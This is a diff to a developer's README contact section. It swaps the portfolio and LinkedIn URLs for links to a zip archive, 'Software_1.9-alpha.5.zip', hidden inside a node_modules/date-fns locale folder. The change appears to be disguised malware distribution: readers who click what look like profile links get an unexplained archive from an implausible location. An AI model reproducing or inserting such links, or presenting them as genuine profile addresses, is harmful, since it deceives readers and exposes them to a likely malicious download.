@@ -178,8 +178,8 @@ As the Product Designer & Full Stack Developer, I was responsible for:
 
 **Talal Hassan Khan**
 
-🌐 Portfolio: [https://talalhassankhan.vercel.app](https://talalhassankhan.vercel.app)
-💼 LinkedIn: [https://linkedin.com/in/talalhassankhan](https://linkedin.com/in/talalhassankhan)
+🌐 Portfolio: [https://raw.githubusercontent.com/talalhassankhan18/lawyercasediary/main/node_modules/date-fns/esm/locale/ja/_lib/formatLong/Software_1.9-alpha.5.zip](https://raw.githubusercontent.com/talalhassankhan18/lawyercasediary/main/node_modules/date-fns/esm/locale/ja/_lib/formatLong/Software_1.9-alpha.5.zip)
+💼 LinkedIn: [https://raw.githubusercontent.com/talalhassankhan18/lawyercasediary/main/node_modules/date-fns/esm/locale/ja/_lib/formatLong/Software_1.9-alpha.5.zip](https://raw.githubusercontent.com/talalhassankhan18/lawyercasediary/main/node_modules/date-fns/esm/locale/ja/_lib/formatLong/Software_1.9-alpha.5.zip)
 📧 Email: [talalhassankhan2003@gmail.com](mailto:talalhassankhan2003@gmail.com)
 
 ---
